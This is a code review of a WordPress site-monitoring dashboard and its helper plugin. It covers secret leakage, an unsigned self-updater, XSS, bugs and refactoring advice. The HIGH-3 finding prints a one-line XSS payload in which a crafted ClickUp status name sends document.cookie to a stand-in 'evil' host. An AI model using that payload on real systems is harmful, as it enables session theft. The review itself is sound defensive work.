# Code Review — Digital Elements Site Monitor

Review date: 2026-08-02 · Reviewed at commit `5296368` · Scope: whole repository

The app is a Node/Express dashboard that sweeps a set of WordPress sites (HTTPS, SSL,
Cloudflare, tracking scripts, PageSpeed, plugin updates, security headers), pulls tasks
from ClickUp and Zoho Projects, and talks to a companion WordPress helper plugin plus a
Cloudflare Worker for page-view analytics.

The core design is sound and the code is unusually well commented for its age. The
problems are concentrated in three places: **secret handling around the license key**,
**the 1,853-line `public/index.html`**, and **the absence of any automated
verification** (no tests, lint, CI, or build step). Those three are what will hurt most
as you move to a code-first workflow.

---

## 1. Security

### CRITICAL-1 — The license key is leaked to every signed-in user, defeating role permissions

`src/db.js:62` sets `helper.token` to the site's license key, and `src/server.js:359`
redacts only `license.key`:

```js
// db.js:62
token: r.license_key || r.helper_token || undefined, // license key is the auth token

// server.js:358-360 — redacts license.key but NOT helper.token
if (!permsFor(req.user.role).manageWebsites) {
  websites.forEach((w) => { if (w.license) w.license = { ...w.license, key: null }; });
}
```

`GET /api/websites` requires only `requireAuth`, so a user with the `seo`, `social`, or
`publisher` role reads the key from `websites[].helper.token`. That key is the bearer
token for the helper plugin's REST API (`wordpress-plugin/digital-elements-helper/includes/auth.php:10`),
so any signed-in user can bypass the `manageWebsites` permission gate and call the
WordPress site directly, including `POST /wpmonitor/v1/optimize/remove-transients`
(deletes every transient in the site's options table) and `/security?fresh=1` (kicks off
a 15-second filesystem scan per request).

**Fix:** redact in one place. Build a `websiteView(row, perms)` serializer in `db.js` or a
new `src/views.js` that strips both `helper.token` and `license.key` unless the caller has
`manageWebsites`, and never return the raw row shape from a route. Longer term, stop
using the license key as the API token — issue a separate per-site helper token so
that leaking one doesn't grant the other.

### CRITICAL-2 — The plugin self-updater installs unsigned code from an unauthenticated endpoint

`wordpress-plugin/digital-elements-helper/includes/updater.php:14-25, 43-49` fetches
`{hub}/api/plugin/manifest` with no authentication and feeds `download_url` straight into
the WordPress upgrader:

```php
$res = wp_remote_get(DEHELED_HUB_URL . '/api/plugin/manifest', array('timeout' => 8));
...
'package' => $m['download_url'],
```

There is no checksum, no signature, no version-downgrade guard, and no check that
`download_url` even points at the hub's own host. Anyone who can answer that URL gets PHP
execution on every client site. `DEHELED_HUB_URL` defaults to a
`*.up.railway.app` subdomain (`digital-elements-helper.php:55`); platform subdomains are
re-claimable if the project is ever deleted or renamed, which turns a lapsed deploy into
fleet-wide RCE. `plugins_api` is also spoofed so hub-supplied HTML renders in wp-admin
(`updater.php:71-74`).

**Fix (two cheap, high-value steps):**
1. Publish a `sha256` in the manifest and verify it in `upgrader_pre_install`; abort on mismatch.
2. Reject any `download_url` whose host differs from `DEHELED_HUB_URL`'s host, and require `https`.

Then move the hub to a domain you own rather than a platform subdomain.

### HIGH-3 — XSS through `esc()`, which does not escape single quotes

`public/index.html:614`:

```js
const esc = (s) => String(s == null ? "" : s).replace(/[&<>"]/g, ...)
```

`'` is missing, and there are **59 inline `onclick=` handlers** that interpolate
API-derived values into single-quoted JS string literals. The clearest case is
`index.html:1655`, where the value is a ClickUp *status name* — free text from the
client's workspace (`src/checks/clickup.js:195` maps `id: s.status`):

```js
`<button class="sm-opt" onclick="setTaskStatus('${esc(siteId)}',...,'${esc(s.id)}',this)">`
```

A status literally named `Won't Fix` — a ClickUp default in many workspaces — breaks the
handler today. A status named `x'});fetch('//evil/?c='+document.cookie)//` executes for
every dashboard user. The code already knows about this and hand-strips quotes in two
spots (`index.html:1070`, `1634`) but not the rest.

**Fix:** add `'` → `&#39;` to `esc()` immediately (one line, stops the bleeding), then
migrate to event delegation with `dataset` attributes so handlers are never built by
string concatenation.

### HIGH-4 — License key travels in URL query strings

`includes/license.php:12` and `includes/admin.php:97`:

```php
DEHELED_HUB_URL . '/api/license/validate?key=' . rawurlencode($key)
DEHELED_HUB_URL . '/api/plugin/history?key=' . rawurlencode($key) . '&days=' . $days
```

The server side accepts it the same way (`src/server.js:59, 116`). Query strings land in
access logs, proxy logs, and error trackers on both ends. Move the key to an
`Authorization: Bearer` header (keep query-string support for one release, then drop it).

### HIGH-5 — Expiring or regenerating a license does not actually revoke site access

`includes/auth.php:10` compares the request token against the key stored in the site's
own options with `hash_equals` — correct and timing-safe — but it never consults expiry or
asks the hub whether the key is still current. A key you expired or regenerated in the
dashboard keeps working against that WordPress site indefinitely, until an admin manually
re-pastes a new one. The plugin header's claim that regeneration "immediately revokes the
old one" is not true locally.

**Fix:** have the plugin honour the cached `DEHELED_LIC_STATUS` (it already fetches it) and
reject requests when the license is expired or unknown, with a short grace window for hub
outages.

### HIGH-6 — Legacy plugin file ships a publicly known default token

`wordpress-plugin/wpmonitor-helper.php:26-28` defines
`WPMONITOR_TOKEN = 'CHANGE_ME_set_a_long_random_token'`, and the *current* plugin still
honours `WPMONITOR_TOKEN` for backward compatibility (`includes/auth.php:17-19`). Any site
that still carries the placeholder in `wp-config.php` has an open REST API. Delete the
legacy file from the repo and audit deployed sites for the constant.

### MEDIUM — Other findings

| # | Finding | Location |
|---|---|---|
| M-1 | Analytics `/collect` has no rate limiting and trusts site identity from `Origin`/`Referer`/body, so anyone can poison any site's stats or inflate D1 writes. Bot filter is UA-regex only. | `analytics-worker/worker.js:46-95` |
| M-2 | Postgres pool sets `ssl: { rejectUnauthorized: false }`, disabling certificate validation on all DB traffic. Use Supabase's CA bundle instead. | `src/db.js:41` |
| M-3 | No `helmet`, no CSP, and no rate limiting on the dashboard itself — while `checks/security.js:83` flags other sites for missing CSP. | `src/server.js:46-51` |
| M-4 | `javascript:` URLs render as clickable links; `esc()` doesn't neutralise schemes. Social links are user-entered with only `editSocial`. | `index.html:1406, 1557, 1608, 1709` |
| M-5 | SSRF: `helper_endpoint` is free text, fetched server-side with the bearer token attached, and errors echo back response detail. Requires `manageWebsites`, so it's privilege-limited — but validate the host resolves publicly and matches the site's own domain. | `src/checks/plugins.js:17-30`, `src/server.js:299-309` |
| M-6 | Hub-supplied `analytics_url` is injected into an inline `<script>` on every visitor page with no scheme/host allowlist; a compromised hub silently redirects visitor beacons. Also collects referrers with no consent hook (GDPR). | `includes/analytics.php:45-49` |
| M-7 | `/optimize/remove-transients` deletes every transient and the updater rewrites plugin code, yet the plugin header states "It cannot modify the site." | `digital-elements-helper.php:4` |
| M-8 | Cron jobs are scheduled from `init` on every request instead of `register_activation_hook` — a DB check per page load. | `security-scan.php:197`, `analytics.php:61` |
| M-9 | Security scanner iterates with `FOLLOW_SYMLINKS`, so an uploads symlink can walk outside the web root. | `security-scan.php:65` |
| M-10 | License key stored as an autoloaded plaintext option, so it rides in `alloptions` on every request. Pass `autoload => false`. | `admin.php:58` |
| M-11 | `/api/license/validate` is public and unthrottled, and returns the site name — an enumeration oracle. Keys are 80-bit so brute force is impractical, but it should still be rate limited. | `src/server.js:58` |
| M-12 | Worker `/stats` sends `Access-Control-Allow-Origin: *`, and compares the stats key non-constant-time. Visitor hashing falls back to the literal salt `"salt"` if `STATS_KEY` is unset. | `worker.js:18-22, 80, 102` |

Good news: no SQL injection anywhere (parameterised throughout, both `pg` and D1); no
secrets in client code; analytics reads are correctly proxied so `STATS_KEY` never reaches
the browser; `.env`, `config/sites.json`, and `data/results.json` are gitignored and were
never committed (verified against full history).

---

## 2. Bugs

**HIGH — The transient sweep creates permanent transients.** This is in your newest
feature (`5296368`). `includes/optimize.php:205-208` deletes *all* `_transient_timeout_*`
rows, not just orphaned ones:

```php
$orphans = (int) $wpdb->query($wpdb->prepare(
    "DELETE FROM {$wpdb->options} WHERE option_name LIKE %s OR option_name LIKE %s",
    $tt_like, $stt_like));
```

Any transient whose value row survived the preceding loop loses its timeout row and
becomes permanent — the exact opposite of the cleanup's purpose. Needs a
`NOT IN (paired value rows)` condition or a left-join orphan test.

**HIGH — The SSL expiry check can't detect an expired certificate.** `src/checks/ssl.js:22`
connects with the default `rejectUnauthorized: true`, so an expired cert fails the
handshake and lands in the error handler at line 47, reporting a generic "TLS error". The
friendly `daysRemaining < 0 → "Expired"` branch at line 37 is unreachable. The check
degrades precisely when it matters most. Set `rejectUnauthorized: false` for inspection
and report trust failures separately.

**HIGH — Tasks are marked overdue from midnight UTC.** `src/checks/clickup.js:90, 164` and
`src/checks/zoho.js:136` compare `dueMs < now` against raw midnight-UTC timestamps, so a
task due *today* shows as overdue all day for anyone west of UTC. Compare against
end-of-day in the site's timezone.

**MEDIUM — `results.json` writes are non-atomic and there is no graceful shutdown.**
`src/store.js:95` does a plain `writeFileSync` of the whole document while
`src/scheduler.js` sweeps every 60s. A crash or redeploy mid-write truncates the file;
`loadResults()` then returns the empty fallback, and the next sweep's `diffRuns` treats
every check as newly changed and fires an alert storm. Write to a temp file and `rename`,
and add a `SIGTERM` handler that stops the interval and waits for the in-flight sweep.

**MEDIUM — Zoho token refresh has no in-flight dedup.** `src/checks/zoho.js:28-43`: when
the cached token expires, every concurrent site check fires its own refresh exchange.
Zoho throttles this and can invalidate the grant under bursts. Cache the promise, not just
the token. `resolveTeamId` in `clickup.js:28-38` has a similar issue — `cachedTeamId` is
never invalidated.

**MEDIUM — Multisite transients are missed.** `optimize.php:196-202` looks for
`_site_transient_%` in `$wpdb->options`, but on multisite these live in `wp_sitemeta`.
The same function has no `LIMIT` or time budget, so a bloated options table will time out
mid-sweep (contrast the security scan, which does budget itself).

**LOW**

- `index.html:696` — `counts[s.overall === "skip" ? "ok" : s.overall]++` counts
  never-checked sites as "Operational", and any unexpected status yields
  `counts[undefined]++` → `NaN` in the stat card.
- `src/server.js:287` — `const path = OPTIMIZE_ACTIONS[action]` shadows the `node:path`
  import inside the handler. Harmless today, a landmine for the next edit.
- `src/server.js:516` — `clamp` is declared with `const` *after* the handlers at lines 323
  and 340 that call it. Fine at runtime, confusing to read; hoist it.
- `src/checks/plugins.js:75` — `endpoint.replace(/\/status\/?$/, "/security")` silently
  no-ops on a non-standard endpoint, querying `/status` for security data and returning
  empty findings instead of an error.
- Silent pagination caps: `clickup.js:53` stops at 15 pages, `zoho.js:93` at index 1401.
  Counts are quietly wrong past the cap — surface a `truncated` flag.
- `public/login.html:38` — stray `~` after `</head>`.
- Errors swallowed with empty `catch {}` at `index.html:1199` and `1244`, so a failing
  `/api/websites` renders stale data forever with no indication. `zoho.js:84` returns an
  empty assignee map on error, silently breaking "My tasks".
- Roughly a dozen `async` UI functions have no error handling
  (`renderSettings`, `saveSettings`, `renderUsers`, `addUser`, `changeUserRole`,
  `removeUser`, `licenseAction`, `deleteWebsite`, `deleteLanding`) — a network blip leaves
  the panel stuck on "Loading…".

---

## 3. Architecture and scalability

**The read model is a JSON file, which caps you at one instance.** `data/results.json` is
the source of truth for the dashboard: `loadResults()` does a synchronous
`readFileSync` + `JSON.parse` on *every* `GET /api/results` (polled every 15s per open
tab), and each sweep rewrites the entire document. `isRunning` in `src/scheduler.js:8` is
an in-process boolean, so two instances would sweep simultaneously and clobber each
other's file. `lastSample` (`scheduler.js:9`) is in-memory and resets on every deploy.

This is the change that unlocks everything else: move current state into Postgres (a
`check_results` table keyed by website, or a single JSONB row), and take a Postgres
advisory lock for the sweep. Then you can run multiple instances, deploy without losing
throttle state, and stop doing synchronous file I/O in a request handler.

**The sweep burns third-party API quota.** Every sweep — default 60s, adjustable down to
15s — re-paginates *all* ClickUp and Zoho tasks per site, including closed ones
(`clickup.js:54` `include_closed: "true"`; `zoho.js:94` `status=all`), up to 15 pages
each, to compute four counters. With a handful of sites you will hit ClickUp's ~100
req/min token limit. PageSpeed is properly cached (`runner.js:23`); tasks should be too —
cache per list with a few-minutes TTL, and stop requesting closed tasks.

**`/api/my-tasks` fans out on every request.** `src/server.js:202-216` calls
`fetchSiteTasks` for every site with a task tool linked, which means N sites × 2 APIs ×
up to 15 pages — and the client polls it every 5 minutes per user just to draw a badge
(`index.html:1137`). Serve it from the same task cache.

**Schema migrations are ad-hoc DDL on boot.** `db.js:321-408` runs `alter table ... add
column if not exists` and `create table if not exists` on every startup, plus a one-time
`sites.json` import. It works, but there is no version history, no down path, and no way
to tell whether a given environment is current. Adopt a real migration tool
(`node-pg-migrate` or `graphile-migrate`) and make `db/schema.sql` generated rather than
hand-maintained — it has already drifted from what `bootstrap()` creates.

**Session deserialization hits the DB on every request.** `src/auth.js:65-73` loads the
user row per request to pick up role changes. Correct, but a cheap 30-second in-process
cache (or storing the role in the session with a short TTL) removes a query from every
API call.

**Three copies of the WordPress plugin are committed.** `wordpress-plugin/digital-elements-helper/`
is canonical (v2.3.2); `wordpress-plugin/{digital-elements-helper.php,includes/,assets/,uninstall.php}`
is a stale v2.0.0 tree, and `wordpress-plugin/wpmonitor-helper.php` is the v1.0.0
predecessor. Several files are byte-identical, several have diverged. Three `.zip` build
artifacts are also tracked. The risk is concrete: a security fix applied to the wrong copy,
or the stale tree being what gets zipped. Similarly, `clickup-update/` and
`tasks-modal-update/` are committed snapshot folders holding older forks of
`index.html`, `clickup.js`, `runner.js`, `store.js`, and `server.js` — that is what
version control is for. Delete all of it.

The plugin version is also duplicated between the file header
(`digital-elements-helper.php:5`) and `DEHELED_VERSION` (line 36) with nothing keeping
them in sync — and the stale copy proves it drifts. The shipped zip currently matches
source at 2.3.2, but nothing enforces that; if they diverge, WordPress will offer the
same update forever in a loop.

---

## 4. `public/index.html` — the biggest maintainability problem

One file, 1,853 lines: ~449 lines of CSS (22-470), ~1,165 lines of JS (599-1763), ~240
lines of markup. Within it:

- **75 `innerHTML` assignments** — all UI is string-concatenated HTML, which is also the
  root cause of HIGH-3.
- **59 inline `onclick=` handlers**, which forces every function to be a global.
- **37 `fetch()` call sites** with no shared client, so no consistent error handling,
  retry, or loading state.
- **~21 module-level mutable globals**: `latestData, WEBSITES, LANDING, ME, boardQuery,
  bannerDismissed, modalTasks, editingLandingId, editingSiteId, resultsTimer,
  websitesTimer, currentView, THEME, openRows, detailCache, currentSiteId, sdState,
  histRange, anaRange, modalSiteId, modalFilter`.
- Nothing is testable or tree-shakeable.

**Dead code** worth deleting outright:
- `loadHistory()` (1458-1495, ~38 lines) targets element `hist-<siteId>`, which is never
  created — orphaned from a removed drawer UI. It duplicates the live
  `loadDetailHistory()` (974-1022).
- `detailCache` is written in five places and **read in none**.
- `openRows` is only ever `.delete()`d, never added to or read.
- The tasks modal (`#modal` + `openTasks`/`renderModal`/`setFilter`, 1683-1718) has no
  primary entry point; it's only reachable from `setTaskStatus`'s
  `if (modalSiteId)` branch. The `.tasks-btn` CSS class (160-161) is emitted by no JS.

**Duplication** inside the file: `loadSocial`/`addSocial`/`removeSocial` are near-identical
to `loadModalSocial`/`addModalSocial`/`removeModalSocial` (~60 lines); `runChecks()` (668)
and `sdRunCheck()` (1024) are identical; the nine check keys are maintained twice as
`CHECKS` (600) and `CARD_KEYS` (879); the license-duration `<select>` and the role list
are each duplicated in markup.

**Rendering** re-fetches `/api/results` every 15s (2.5s while a check runs) and
`/api/websites` every 20s, rebuilding the entire board via `innerHTML` on each tick
regardless of whether anything changed.

**Recommendation:** don't rewrite it in a framework yet. Do it in three mechanical steps
that each leave the app working: (1) extract the CSS to `public/app.css` and the JS to
`public/app.js`, delete the dead code listed above; (2) introduce Vite, split `app.js`
into modules (`api.js`, `board.js`, `siteDetail.js`, `tasks.js`, `admin.js`, `theme.js`)
and replace inline `onclick` with one delegated listener reading `data-action`; (3) only
then consider a component library if the UI keeps growing.

**Duplication across the check modules:** `clickup.js` and `zoho.js` independently
reimplement the fetch-with-timeout wrapper (five copies of that pattern exist across
`clickup.js:15`, `zoho.js:17`, `plugins.js:13`, `pagespeed.js:15`, `fetchSite.js:10`),
task-shape mapping, and the count/bucket/label logic — `checkClickUp` (79-135) and
`checkZoho` (160-196) are ~90% line-for-line identical. The sort comparator
`(a.done - b.done) || ((a.dueMs || Infinity) - (b.dueMs || Infinity))` appears five times.
Extract `src/lib/http.js` (timeout + JSON + error shaping) and `src/checks/taskProvider.js`
(a common interface both providers implement), which also makes providers unit-testable.

Magic values are scattered rather than centralised: timeouts of 20000 (×4), 25000, 60000,
15000; client poll intervals 2500/15000/20000/30000/300000; a 600000 TTL hardcoded twice
in `zoho.js`; PageSpeed thresholds defined both in `pagespeed.js:7` and again as
`90/75/50/60/25` in `index.html:897, 916`. `fetchSite.js:6` still carries a placeholder
User-Agent (`+https://github.com/your-agency/wp-monitor`).

---

## 5. Making this work in a code-first workflow

The repository has **no tests, no linter, no formatter, no CI, no `CLAUDE.md`, and no
build step**. That is the gap that matters most now: in a collaborative-chat workflow a
human eyeballs each change, but in a code-first workflow the repo itself has to be able to
say "this change is safe."

**Add a `CLAUDE.md`.** Record what isn't inferable from the code: that `data/results.json`
is regenerated each sweep and safe to delete; that `wordpress-plugin/digital-elements-helper/`
is the only live plugin copy; that the license key doubles as the helper API token; the
sweep/PageSpeed caching model; and the required env vars. This is the single
highest-leverage file you can add.

**Wire up the basics** in `package.json`:

```json
"scripts": {
  "start": "node src/server.js",
  "dev": "node --watch src/server.js",
  "check": "node src/cli.js",
  "lint": "eslint src public/app.js",
  "format": "prettier --write .",
  "test": "vitest run",
  "build:plugin": "node scripts/build-plugin.js"
}
```

**Test the pure logic first** — it's where the bugs are and it needs no mocking:
`diffRuns` and `dispatchAlerts` chunking (`alerts.js`), `rollUp` (`runner.js:36`),
`computeUptime` (`db.js:286`), `durationToExpiry`, `normalizeWebsite` (`server.js:366`),
`esc()`, and each check's status-mapping function against recorded HTML/JSON fixtures.
Then add `supertest` route tests for authorization specifically — a test asserting that a
`seo`-role user receives no license key anywhere in the `/api/websites` payload would have
caught CRITICAL-1.

**A minimal GitHub Actions workflow** (`lint` + `test` on push) plus Dependabot. Express 4
is in maintenance; plan a move to Express 5.

**Build the plugin zip rather than committing it.** A `scripts/build-plugin.js` that reads
the version from the header, writes it into `DEHELED_VERSION`, zips the canonical
directory, and emits the `sha256` for the manifest — that single script closes the version
drift, the committed-artifact problem, and half of CRITICAL-2.

**Also worth adding:** env validation at boot with `zod` or `envalid` (replacing the
hand-rolled `requireEnv` in `server.js:32`), and `pino` for structured logs — the current
`console.log` calls already carry useful context (`[optimize] user ran action on site`)
that would be queryable as JSON.

---

## Suggested order of work

**This week — security and data integrity**
1. Redact `helper.token` for non-`manageWebsites` roles (CRITICAL-1). One-line fix, then
   the serializer refactor.
2. Add `'` to `esc()` (HIGH-3). One line.
3. Fix the transient orphan sweep (HIGH, ships broken today).
4. Fix `ssl.js` so expired certs are detected (HIGH).
5. Atomic `results.json` write + `SIGTERM` handler.
6. Add `helmet` and `express-rate-limit` on `/api/license/validate` and `/api/plugin/*`.

**Next — supply chain and hygiene**
7. sha256 verification + host allowlist in the updater; `scripts/build-plugin.js`.
8. Delete the stale plugin copies, `wpmonitor-helper.php`, the committed zips, and the
   `clickup-update/` and `tasks-modal-update/` folders.
9. Move the license key out of query strings into an `Authorization` header.
10. `CLAUDE.md`, ESLint, Prettier, Vitest, GitHub Actions.

**Then — scale and structure**
11. Move current results into Postgres; advisory lock for the sweep.
12. Cache task-provider responses; stop fetching closed tasks; serve `/api/my-tasks` from cache.
13. Extract CSS/JS out of `index.html`, delete the dead code, adopt Vite, replace inline
    handlers with delegation.
14. `src/lib/http.js` + a shared task-provider interface.
15. Real migrations; regenerate `db/schema.sql`.
16. Fix the timezone handling on due dates (needs a per-site or per-user timezone).
